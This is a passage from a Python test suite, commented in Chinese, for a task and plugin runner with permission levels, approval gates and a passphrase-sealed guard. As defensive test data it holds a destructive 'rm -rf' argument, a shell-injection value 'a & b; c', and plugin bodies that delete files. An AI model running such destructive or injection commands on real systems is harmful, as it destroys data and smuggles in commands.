        ext = data["extend"]
        expect(ext["desc"] == "打招呼", "desc 应回传，实际 %r" % ext["desc"])
        expect(ext["commands"].get("greet") == "--name x",
               "commands 应回传，实际 %r" % ext["commands"])
        expect(ext["state"] == "active", "应为 active，实际 %r" % ext["state"])

        rc, data = sb.json_out("extend", "help", "ghost", "--json")
        expect(rc == 3, "未知插件应返回 EXIT_CONFLICT(3)，实际 %s" % rc)
        expect(data.get("error") == "not_found", "应报 not_found，实际 %r" % data.get("error"))

        rc, data = sb.json_out("extend", "help", "../escape", "--json")
        expect(rc == 3, "带 .. 的 id 应按 not_found 处理，实际 %s" % rc)
    finally:
        sb.cleanup()


@case
def extend_check_reports_gate():
    """合法插件：check 算出等级、过权限门、给出 would，并声明未执行。"""
    sb = Sandbox()
    try:
        write_extend(sb.root, "hello")
        rc, data = sb.json_out("extend", "check", "hello", "--action", "run", "--json")
        expect(data.get("executed") is False, "check 必须声明 executed=false，实际 %r"
               % data.get("executed"))
        expect(data["state"] == "active", "应为 active，实际 %r" % data["state"])
        expect(data["level"] == "L2", "插件声明 L2 应保持 L2，实际 %r" % data["level"])
        gate = data["gate"]
        expect(gate["required_level"] == "L2",
               "required 应为 L2，实际 %r" % gate["required_level"])
        expect(gate["lease_checked"] is False and gate["approval_checked"] is False,
               "预演不得查租约或审批，实际 %r / %r"
               % (gate["lease_checked"], gate["approval_checked"]))
        # 默认策略 approval_mode_by_level 把 L2 定为 ask：插件执行默认要审批，
        # 这正是「插件不能自己决定直通」的体现。
        expect(gate["approval_mode"] == "ask",
               "默认策略下 L2 模式应为 ask，实际 %r" % gate["approval_mode"])
        expect(gate["would"] == "approval_required",
               "L2 应判需审批，实际 %r (%r)"
               % (gate["would"], gate.get("reason")))
        expect(rc == 0, "check 是诊断命令，结论非 allow 也应退出 0，实际 %s" % rc)

        text = data["gate_text"]
        entry = str(Path(sb.root) / "extend" / "hello" / "__init__.py")
        expect(entry in text, "门禁文本应含入口绝对路径，实际 %r" % text)
        expect(sys.executable in text,
               "门禁文本应以当前解释器开头（依赖校验用的就是它），实际 %r" % text)

        rc, out, err = sb.ats("extend", "check", "hello", "--action", "run")
        expect(rc == 0, "文本模式 check 应退出 0，实际 %s\n%s\n%s" % (rc, out, err))
        expect("executed : no" in out, "文本输出应显式声明未执行，实际 %r" % out)
        expect(entry in out, "文本输出应显示门禁文本，实际 %r" % out)
    finally:
        sb.cleanup()


@case
def extend_check_never_executes():
    """check 不得执行插件：入口副作用不发生，preflight 也不试跑。"""
    sb = Sandbox()
    try:
        marker = Path(sb.root) / "executed.marker"
        write_extend(
            sb.root, "sideeffect",
            entry_text="import pathlib\npathlib.Path(%r).write_text('boom')\n" % str(marker),
        )
        rc, data = sb.json_out("extend", "check", "sideeffect", "--json")
        expect(not marker.exists(),
               "extend check 不得执行插件代码，但入口副作用已发生：%s" % marker)
        expect(data.get("executed") is False, "check 必须声明未执行")
        expect(data["preflight"] is not None, "应带静态预检结果")
    finally:
        sb.cleanup()


@case
def extend_check_dangerous_arg_raises_level():
    """参数里的硬危险命令抬高 required，不被插件声明的 L2 压住。"""
    sb = Sandbox()
    try:
        write_extend(sb.root, "hello")
        rc, data = sb.json_out("extend", "check", "hello",
                               "--action", "run", "--arg", "rm -rf /tmp/x", "--json")
        gate = data["gate"]
        expect(gate["hard_floor"] == "L3",
               "rm -rf 应触发 L3 硬下限，实际 %r" % gate["hard_floor"])
        expect(gate["required_level"] == "L3",
               "required 应抬到 L3，实际 %r" % gate["required_level"])
        expect(data["level"] == "L2",
               "插件自身等级仍应是 L2，抬高只发生在门禁层，实际 %r" % data["level"])
    finally:
        sb.cleanup()


@case
def extend_check_inactive_and_unknown_action():
    """inactive 插件直接 deny；未知指令名报 unknown_action 并列出可用指令。"""
    sb = Sandbox()
    try:
        write_extend(sb.root, "noentry", entry_name="run.py", entry_text=None)
        rc, data = sb.json_out("extend", "check", "noentry", "--json")
        expect(rc == 4, "inactive 插件应退出 EXIT_DENIED(4)，实际 %s" % rc)
        expect(data.get("error") == "inactive_extend",
               "应报 inactive_extend，实际 %r" % data.get("error"))
        expect(data.get("would") == "deny", "inactive 应判 deny，实际 %r" % data.get("would"))
        expect(data.get("executed") is False, "inactive 也必须声明未执行")

        write_extend(sb.root, "hello", commands={"run": "x"})
        rc, data = sb.json_out("extend", "check", "hello",
                               "--action", "nope", "--json")
        expect(rc == 2, "未知指令名应退出 EXIT_USAGE(2)，实际 %s" % rc)
        expect(data.get("error") == "unknown_action",
               "应报 unknown_action，实际 %r" % data.get("error"))
        expect(data.get("known") == ["run"],
               "应列出可用指令 run，实际 %r" % data.get("known"))
    finally:
        sb.cleanup()


@case
def extend_check_no_approval_side_effect():
    """check 不得留下审批记录：预演走 gate_preview，不写 approvals/。"""
    sb = Sandbox()
    try:
        write_extend(sb.root, "hello")
        adir = Path(sb.root) / "approvals"

        def snapshot():
            return sorted(p.name for p in adir.glob("ap-*.json")) if adir.is_dir() else []

        before = snapshot()
        sb.json_out("extend", "check", "hello", "--action", "run", "--json")
        after = snapshot()
        expect(before == after,
               "check 不得写审批记录，%r -> %r" % (before, after))
    finally:
        sb.cleanup()


@case
def extend_check_scans_plugin_source():
    """插件源码经门禁文本进入静态扫描：入口里的删除调用必须被识别。"""
    sb = Sandbox()
    try:
        write_extend(sb.root, "danger",
                     entry_text="import os\nos.remove('/tmp/x')\n")
        rc, data = sb.json_out("extend", "check", "danger", "--json")
        pf = data["preflight"]
        expect(pf is not None, "应带静态预检结果")
        expect("fs_delete" in (pf.get("tags") or []),
               "入口里的 os.remove 应标 fs_delete，实际 tags=%r" % pf.get("tags"))
        expect(pf.get("confidence") in ("low", "medium", "high"),
               "应给出置信度，实际 %r" % pf.get("confidence"))
        sources = pf.get("sources") or []
        entry = str(Path(sb.root) / "extend" / "danger" / "__init__.py")
        expect(any(s.get("file") == entry and s.get("ok") for s in sources),
               "应真的解析了插件入口 %s，实际 sources=%r" % (entry, sources))
    finally:
        sb.cleanup()


AUTO_POLICY = {"approval_mode_by_level": {"L0": "auto", "L1": "auto",
                                          "L2": "auto", "L3": "auto"}}


@case
def extend_run_executes_and_binds_text():
    """run 真执行插件；task.command 必须与 check 的 gate_text 完全相同。"""
    sb = Sandbox()
    try:
        marker = Path(sb.root) / "ran.marker"
        write_extend(
            sb.root, "hello",
            entry_text=("import pathlib, sys\n"
                        "pathlib.Path(%r).write_text('|'.join(sys.argv[1:]))\n" % str(marker)),
        )
        sb.write_policy(AUTO_POLICY)

        rc, chk = sb.json_out("extend", "check", "hello", "--action", "run", "--json")
        expect(rc == 0, "check 应退出 0，实际 %s" % rc)

        rc, run = sb.json_out("extend", "run", "hello", "--action", "run",
                              "--id", "ext-1", "--wait", "--json")
        expect(rc == 0, "auto 策略下 run 应退出 0，实际 %s\n%s" % (rc, run))
        expect(run["task"]["status"] == "succeeded",
               "插件应执行成功，实际 %r" % run["task"]["status"])
        expect(marker.exists(), "插件应真的被执行，但 marker 不存在")
        expect(marker.read_text(encoding="utf-8") == "--action|run",
               "插件应收到 --action run，实际 %r"
               % marker.read_text(encoding="utf-8"))

        task = json.loads((Path(sb.root) / "tasks" / "ext-1" / "task.json")
                          .read_text(encoding="utf-8"))
        expect(task["command"] == chk["gate_text"],
               "task.command 必须等于 check 的 gate_text（审批绑定同源）\n%r\n!=\n%r"
               % (task["command"], chk["gate_text"]))
        expect(task["shell"] is False,
               "插件任务必须 shell=False，实际 %r" % task["shell"])
        expect(task["level"] == "L2", "task level 应为 L2，实际 %r" % task["level"])
        expect(task["cwd"] == str(Path(sb.root) / "extend" / "hello"),
               "task cwd 应为插件目录，实际 %r" % task["cwd"])
        expect(task["tags"] == ["extend", "hello"],
               "task tags 应标注来源，实际 %r" % task["tags"])
    finally:
        sb.cleanup()


@case
def extend_run_requires_approval_by_default():
    """默认策略 L2=ask：run 返回 approval_required，插件不得被执行。"""
    sb = Sandbox()
    try:
        marker = Path(sb.root) / "ran.marker"
        write_extend(
            sb.root, "hello",
            entry_text="import pathlib\npathlib.Path(%r).write_text('x')\n" % str(marker),
        )
        rc, run = sb.json_out("extend", "run", "hello", "--action", "run",
                              "--id", "ext-2", "--wait", "--json")
        expect(rc == 4, "默认 L2=ask 应返回 EXIT_DENIED(4)，实际 %s\n%s" % (rc, run))
        expect(run.get("error") == "approval_required",
               "应报 approval_required，实际 %r" % run.get("error"))
        expect(run.get("approval_id"), "应给出 approval_id，实际 %r" % run.get("approval_id"))
        expect(not marker.exists(), "未审批前插件不得被执行")
    finally:
        sb.cleanup()


@case
def extend_run_args_not_interpreted_by_shell():
    """argv 模式：参数里的 & 与 ; 只当普通字符，不会变成第二条命令。"""
    sb = Sandbox()
    try:
        out = Path(sb.root) / "argv.txt"
        write_extend(
            sb.root, "echoargs",
            entry_text=("import pathlib, sys\n"
                        "pathlib.Path(%r).write_text(repr(sys.argv[1:]))\n" % str(out)),
        )
        sb.write_policy(AUTO_POLICY)
        rc, run = sb.json_out("extend", "run", "echoargs", "--action", "run",
                              "--arg", "a & b; c", "--id", "ext-3", "--wait", "--json")
        expect(rc == 0, "run 应退出 0，实际 %s\n%s" % (rc, run))
        content = out.read_text(encoding="utf-8")
        expect("'a & b; c'" in content,
               "参数应原样到达插件（不经过 shell），实际 %r" % content)
        expect("hacked" not in content and content.count("--action") == 1,
               "参数不应被 shell 拆成多条命令，实际 %r" % content)
    finally:
        sb.cleanup()


@case
def extend_run_rejects_inactive_and_policy_cap():
    """inactive 插件不建 task；策略上限低于插件等级时判 denied_policy。"""
    sb = Sandbox()
    try:
        write_extend(sb.root, "noentry", entry_name="run.py", entry_text=None)
        rc, run = sb.json_out("extend", "run", "noentry", "--action", "run",
                              "--id", "ext-4", "--json")
        expect(rc == 4, "inactive 插件应退出 EXIT_DENIED(4)，实际 %s" % rc)
        expect(run.get("error") == "inactive_extend",
               "应报 inactive_extend，实际 %r" % run.get("error"))
        expect(not (Path(sb.root) / "tasks" / "ext-4").exists(),
               "inactive 插件不得建 task")

        write_extend(sb.root, "hello")
        sb.write_policy({"max_level": "L1"})
        rc, run = sb.json_out("extend", "run", "hello", "--action", "run",
                              "--id", "ext-5", "--json")
        expect(rc == 4, "策略上限 L1 应拒绝 L2 插件，实际 %s\n%s" % (rc, run))
        expect(run.get("error") == "denied_policy",
               "应报 denied_policy，实际 %r" % run.get("error"))
        task = json.loads((Path(sb.root) / "tasks" / "ext-5" / "task.json")
                          .read_text(encoding="utf-8"))
        expect(task["status"] == "pending",
               "被策略拒绝的 task 应停在 pending，实际 %r" % task["status"])
    finally:
        sb.cleanup()


# ---------------------------------------------------------------- 口令闸门

@case
def guard_init_refuses_rebuild():
    """密钥只建一次：清单或密钥任一存在时 init 必须拒绝，不给「重置」入口。"""
    sb = Sandbox()
    sb.auto_seal = False
    try:
        rc, out, err = run_script(GUARD, sb.root, "init", "--confirm",
                                  passphrase=TEST_PASSPHRASE)
        expect(rc == 0, "首次 init 应成功，实际 %s\n%s\n%s" % (rc, out, err))
        expect((sb.root / "ats_guard_key.json").is_file(), "应生成密钥文件")

        rc, out, err = init_and_seal(sb.root)
        expect(rc == 0, "封签应成功，实际 %s\n%s\n%s" % (rc, out, err))

        rc, out, err = run_script(GUARD, sb.root, "init", "--confirm",
                                  passphrase="attacker-chosen-passphrase")
        expect(rc == 4, "清单已存在时 init 应拒绝，实际 %s\n%s" % (rc, out))
        payload = json.loads(out)
        expect(payload.get("error") == "already_initialized",
               "应报 already_initialized，实际 %r" % payload.get("error"))

        rc, out, err = run_script(GUARD, sb.root, "auth",
                                  passphrase=TEST_PASSPHRASE)
        expect(rc == 0, "原口令仍应有效，实际 %s\n%s" % (rc, out))

        # 只删清单、留下密钥，曾能用新口令覆盖信任根；密钥不可合法再生，
        # 因此这里必须仍然拒绝，且拒绝后原口令不受影响。
        (sb.root / "ats_guard_manifest.json").unlink()
        rc, out, err = run_script(GUARD, sb.root, "init", "--confirm",
                                  passphrase="attacker-chosen-passphrase")
        expect(rc == 4, "只剩密钥文件时 init 也应拒绝，实际 %s\n%s" % (rc, out))
        payload = json.loads(out)
        expect(payload.get("error") == "already_initialized",
               "应报 already_initialized，实际 %r" % payload.get("error"))
        expect(str(sb.root / "ats_guard_key.json") in (payload.get("existing") or []),
               "应点出已存在的密钥文件，实际 %r" % payload.get("existing"))

        rc, out, err = run_script(GUARD, sb.root, "auth",
                                  passphrase=TEST_PASSPHRASE)
        expect(rc == 0, "拒绝重建后原口令仍应有效，实际 %s\n%s" % (rc, out))
    finally:
        sb.cleanup()


@case
def guard_key_loss_points_to_restore():
    """密钥丢失：verify 报 restore_key；seal 在此场景修不好，ats.py 提示不能指向重封签。"""
    sb = Sandbox()
    sb.auto_seal = False
    try:
        rc, out, err = init_and_seal(sb.root)
        expect(rc == 0, "封签应成功，实际 %s\n%s\n%s" % (rc, out, err))
        (sb.root / "ats_guard_key.json").unlink()

        rc, out, err = run_script(GUARD, sb.root, "verify")
        expect(rc == 4, "密钥丢失应导致 verify 失败，实际 %s\n%s" % (rc, out))
        payload = json.loads(out)
        expect(payload.get("next_action") == "restore_key",
               "应给出 restore_key，实际 %r" % payload.get("next_action"))
        expect("git" in (payload.get("hint") or ""),
               "提示应指向从 git 恢复，实际 %r" % payload.get("hint"))

        # seal 要先口令校验，口令校验要读密钥：这里必然失败，不能作为下一步
        rc, out, err = run_script(GUARD, sb.root, "seal", "--confirm",
                                  passphrase=TEST_PASSPHRASE)
        expect(rc != 0, "密钥丢失时 seal 应失败，实际 %s\n%s" % (rc, out))

        rc, out, err = sb.ats("list")
        expect(rc == 4, "密钥丢失时命令应被拦，实际 %s\n%s" % (rc, out))
        payload = json.loads(out)
        hint = (payload.get("detail") or {}).get("hint") or ""
        expect("seal 也修不好" in hint, "ats.py 提示应说明 seal 修不好，实际 %r" % hint)
        expect("恢复" in hint, "ats.py 提示应指向恢复，实际 %r" % hint)
    finally:
        sb.cleanup()


@case
def guard_manifest_loss_guides_to_seal():
    """密钥在、清单丢：verify 指向 seal（init 会 already_initialized 拒绝），seal 能重建基线。"""
    sb = Sandbox()
    sb.auto_seal = False
    try:
        rc, out, err = init_and_seal(sb.root)
        expect(rc == 0, "封签应成功，实际 %s\n%s\n%s" % (rc, out, err))
        (sb.root / "ats_guard_manifest.json").unlink()

        rc, out, err = run_script(GUARD, sb.root, "verify")
        payload = json.loads(out)
        expect(payload.get("next_action") == "seal",
               "密钥仍在时应指向 seal，实际 %r" % payload.get("next_action"))

        rc, out, err = run_script(GUARD, sb.root, "seal", "--confirm",
                                  passphrase=TEST_PASSPHRASE)
        expect(rc == 0, "密钥仍在时 seal 应能重建基线，实际 %s\n%s" % (rc, out))
        rc, out, err = run_script(GUARD, sb.root, "verify")
        expect(rc == 0, "重建后 verify 应通过，实际 %s\n%s" % (rc, out))
    finally:
        sb.cleanup()


@case
def guard_init_requires_confirm_and_length():
    """init 要 --confirm，且口令有最短长度；两者不满足都不落盘。"""
    sb = Sandbox()
    sb.auto_seal = False
    try:
        rc, out, err = run_script(GUARD, sb.root, "init",
                                  passphrase=TEST_PASSPHRASE)
        expect(rc == 2, "无 --confirm 应返回 EXIT_USAGE，实际 %s\n%s" % (rc, out))
        expect(json.loads(out).get("error") == "confirm_required",
               "应报 confirm_required")
        expect(not (sb.root / "ats_guard_key.json").exists(), "被拒绝时不应落盘密钥")

        rc, out, err = run_script(GUARD, sb.root, "init", "--confirm",
                                  passphrase="short")
        expect(rc == 2, "过短口令应返回 EXIT_USAGE，实际 %s\n%s" % (rc, out))
        expect(json.loads(out).get("error") == "passphrase_too_short",
               "应报 passphrase_too_short")
        expect(not (sb.root / "ats_guard_key.json").exists(), "被拒绝时不应落盘密钥")
    finally:
        sb.cleanup()


@case
def guard_seal_requires_correct_passphrase():
    """seal 要口令：缺失与错误都不许重建基线。"""
    sb = Sandbox()
    sb.auto_seal = False
    try:
        rc, out, err = run_script(GUARD, sb.root, "init", "--confirm",
                                  passphrase=TEST_PASSPHRASE)
        expect(rc == 0, "init 应成功，实际 %s\n%s\n%s" % (rc, out, err))

        rc, out, err = run_script(GUARD, sb.root, "seal", "--confirm")
        expect(rc == 4, "无口令封签应被拒，实际 %s\n%s" % (rc, out))
        payload = json.loads(out)
        expect(payload.get("error") == "passphrase_required",
               "应报 passphrase_required，实际 %r" % payload.get("error"))
        expect(not sb.manifest.exists(), "被拒绝时不应落盘清单")

        rc, out, err = run_script(GUARD, sb.root, "seal", "--confirm",
                                  passphrase="wrong-passphrase")
        expect(rc == 4, "错误口令封签应被拒，实际 %s\n%s" % (rc, out))
        payload = json.loads(out)
        expect((payload.get("detail") or {}).get("error") == "passphrase_mismatch",
               "应报 passphrase_mismatch，实际 %r" % payload.get("detail"))
        expect(not sb.manifest.exists(), "错误口令不应落盘清单")

        rc, out, err = run_script(GUARD, sb.root, "seal", "--confirm",
                                  passphrase=TEST_PASSPHRASE)
        expect(rc == 0, "正确口令封签应成功，实际 %s\n%s" % (rc, out))
        expect(sb.manifest.is_file(), "应落盘清单")
    finally:
        sb.cleanup()


@case
def guard_auth_verifies_without_side_effect():
    """auth 只校验口令：对错分别给 0 / 4，且不写任何文件。"""
    sb = Sandbox()
    sb.auto_seal = False
    try:
        rc, out, err = run_script(GUARD, sb.root, "init", "--confirm",
                                  passphrase=TEST_PASSPHRASE)
        expect(rc == 0, "init 应成功，实际 %s\n%s\n%s" % (rc, out, err))
        key_path = sb.root / "ats_guard_key.json"
        before = key_path.read_bytes()

        rc, out, err = run_script(GUARD, sb.root, "auth", passphrase=TEST_PASSPHRASE)
        expect(rc == 0, "正确口令应通过，实际 %s\n%s" % (rc, out))
        expect(json.loads(out).get("ok") is True, "应返回 ok=true")

        rc, out, err = run_script(GUARD, sb.root, "auth", passphrase="nope-nope-nope")
        expect(rc == 4, "错误口令应被拒，实际 %s\n%s" % (rc, out))
        expect(json.loads(out).get("error") == "passphrase_mismatch",
               "应报 passphrase_mismatch")

        rc, out, err = run_script(GUARD, sb.root, "auth")
        expect(rc == 4, "空口令应被拒，实际 %s\n%s" % (rc, out))
        expect(json.loads(out).get("error") == "passphrase_missing",
               "应报 passphrase_missing")

        expect(key_path.read_bytes() == before, "auth 不应改写密钥文件")
        expect(not sb.manifest.exists(), "auth 不应生成清单")
    finally:
        sb.cleanup()


@case
def guard_tracks_key_file_digest():
    """密钥文件进清单：换掉密钥（换口令）必须被发现。"""
    sb = Sandbox()
    sb.auto_seal = False
    try:
        rc, out, err = init_and_seal(sb.root)
        expect(rc == 0, "封签应成功，实际 %s\n%s\n%s" % (rc, out, err))
        data = json.loads(sb.manifest.read_text(encoding="utf-8"))
        expect((data.get("key") or {}).get("sha256"), "清单应记录密钥摘要")

        key_path = sb.root / "ats_guard_key.json"
        record = json.loads(key_path.read_text(encoding="utf-8"))
        record["hash"] = "0" * 64
        key_path.write_text(json.dumps(record), encoding="utf-8")

        rc, out, err = run_script(GUARD, sb.root, "verify")
        expect(rc == 4, "替换密钥应导致 verify 失败，实际 %s\n%s" % (rc, out))
        problems = json.loads(out).get("problems") or []
        expect(any(p.get("file") == "ats_guard_key.json"
                   and p.get("error") == "digest_mismatch" for p in problems),
               "应报 ats_guard_key.json digest_mismatch，实际 %r" % (problems,))

        rc, out, err = sb.ats("list")
        expect(rc == 4, "换密钥后 ats.py 启动应被拒，实际 %s\n%s" % (rc, out))
    finally:
        sb.cleanup()


@case
def approve_requires_passphrase():
    """审批入口要口令：缺失/错误都拒，正确才放行。"""
    sb = Sandbox()
    try:
        sb.json_out("create", "gated", "--command", "echo x", "--level", "L0")
        rc, out, err = sb.ats("delete", "gated")
        expect(rc == 4, "delete 无审批应退出 4，实际 %s\n%s" % (rc, out))
        approval_id = json.loads(out).get("approval_id")
        expect(approval_id, "应生成审批单号")

        rc, out, err = sb.ats("approve", approval_id, passphrase=None)
        expect(rc == 4, "无口令审批应被拒，实际 %s\n%s" % (rc, out))
        payload = json.loads(out)
        expect(payload.get("error") == "passphrase_required",
               "应报 passphrase_required，实际 %r" % payload.get("error"))

        rc, out, err = sb.ats("approve", approval_id, passphrase="wrong-passphrase")
        expect(rc == 4, "错误口令审批应被拒，实际 %s\n%s" % (rc, out))
        payload = json.loads(out)
        expect((payload.get("detail") or {}).get("error") == "passphrase_mismatch",
               "应报 passphrase_mismatch，实际 %r" % payload.get("detail"))

        rc, out, err = sb.ats("approve", approval_id)
        expect(rc == 0, "正确口令应批准成功，实际 %s\n%s" % (rc, out))

        rc, out, err = sb.ats("delete", "gated", "--approval", approval_id)
        expect(rc == 0, "批准后 delete 应成功，实际 %s\n%s" % (rc, out))
    finally:
        sb.cleanup()


@case
def restricted_policy_set_requires_passphrase():
    """放松型键必须持口令；无害键不受影响。"""
    sb = Sandbox()
    try:
        rc, out, err = sb.ats("policy", "--set", "actor_level", "L0", "--json",
                              passphrase=None)
        expect(rc == 4, "无口令改 actor_level 应被拒，实际 %s\n%s" % (rc, out))
        payload = json.loads(out)
        expect(payload.get("error") == "passphrase_required",
               "应报 passphrase_required，实际 %r" % payload.get("error"))
        expect("actor_level" in (payload.get("restricted") or []),
               "应把 actor_level 标为 restricted，实际 %r" % payload.get("restricted"))

        rc, out, err = sb.ats("policy", "--json")
        expect(rc == 0, "策略读取应正常，实际 %s\n%s" % (rc, out))
        expect(json.loads(out).get("actor_level") == "L3",
               "被拒的改动不应生效")

        rc, out, err = sb.ats("policy", "--set", "actor_level", "L2", "--json")
        expect(rc == 0, "持口令应允许改 actor_level，实际 %s\n%s" % (rc, out))
        expect(json.loads(out).get("actor_level") == "L2", "改动应生效")

        rc, out, err = sb.ats("policy", "--set", "stall_seconds", "120", "--json",
                              passphrase=None)
        expect(rc == 4, "任何 --set 都要口令（重封签需要它），实际 %s\n%s" % (rc, out))
        payload = json.loads(out)
        expect(payload.get("restricted") == [],
               "无害键不应被标为 restricted，实际 %r" % payload.get("restricted"))

        rc, out, err = sb.ats("policy", "--set", "stall_seconds", "120", "--json")
        expect(rc == 0, "持口令应允许改无害键，实际 %s\n%s" % (rc, out))
        expect(json.loads(out).get("stall_seconds") == 120, "改动应生效")
    finally:
        sb.cleanup()


# ---------------------------------------------------------------- 入口

def utf8_console():
    """把 stdout/stderr 切到 UTF-8。

    Windows 上被管道重定向时默认用 cp1252，打印中文会抛 UnicodeEncodeError，
    表现为用例全过却退出码非零。
    """
    for stream in (sys.stdout, sys.stderr):
        reconfigure = getattr(stream, "reconfigure", None)
        if reconfigure:
            try:
                reconfigure(encoding="utf-8")
            except (ValueError, OSError):
                pass


def main(argv):
    utf8_console()
    keyword = None
    if "-k" in argv:
        i = argv.index("-k")
        if i + 1 < len(argv):
            keyword = argv[i + 1]

    selected = [c for c in CASES if not keyword or keyword in c.__name__]
    if not selected:
        print("没有匹配的用例: %r" % keyword)
        return 1

    failed = []
    for fn in selected:
        name = fn.__name__
        try:
            fn()
        except Exception as exc:
            failed.append((name, exc))
            print("FAIL  %s\n      %s" % (name, str(exc).replace("\n", "\n      ")))
        else:
            print("PASS  %s" % name)

    print("\n%d/%d 通过" % (len(selected) - len(failed), len(selected)))
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
